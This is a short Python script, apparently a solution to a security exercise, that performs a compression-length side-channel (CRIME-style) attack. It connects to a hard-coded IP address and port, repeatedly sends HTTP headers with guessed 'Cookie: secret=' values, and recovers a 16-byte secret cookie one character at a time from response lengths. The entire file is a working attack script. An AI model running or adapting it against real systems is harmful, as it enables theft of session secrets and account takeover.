import socket
import string

HOST = '140.122.185.174'
port = 8081
BUFFER_SIZE = 1024  # Normally 1024, the lower the number is, the response is faster
char_bytes = 16  # How many bytes you want to try (Final bytes "char_bytes = 16")
SECRET = ''

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, port))

for char_byte in range(1, char_bytes + 1):
    HEADERS = ("User−Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) "
               "AppleWebKit/537.1 (KHTML, like Gecko) "
               "Chrome/22.0.1207.1 Safari/537.1\r\n"
               "Accept: */*\r\n"
               "Referer: https://thebankserver.com/\r\n"
               "Cookie: secret=") + SECRET

    possible_charset = string.digits + string.ascii_letters
    possible_char_dict = dict()

    while len(possible_charset) != 1:
        if HEADERS is None:
            print('Cannot found QAQ')
            break

        for alp in possible_charset:
            test = HEADERS + str(alp)

            s.send(test.encode("utf-8") + b'\r\n')
            data = s.recv(BUFFER_SIZE)
            len_data = len(data)
            # Test the length of the receive msg from server
            # print(alp, len_data)
            possible_char_dict[alp] = len_data

        # # Print possible char set & char dictionary
        # print(possible_charset)
        # print(possible_char_dict)

        # Find min value of possible_charset
        min_val = min(possible_char_dict.values())
        new_charset = "".join(sk for sk, sv in possible_char_dict.items() if sv == min_val)
        # print(new_charset, len(new_charset))

        # New set for next round if len(possible_charset) is not 1
        possible_charset = new_charset
        possible_char_dict = dict()
        HEADERS = HEADERS[1:]

    # # The last message I sent for each byte
    # print('\r\n' + test)

    # The possible answer
    SECRET += possible_charset
    print('Answer of first %s bytes: secret=%s' % (char_byte, SECRET))

print('\nFinal result: secret=%s' % SECRET)
s.close()
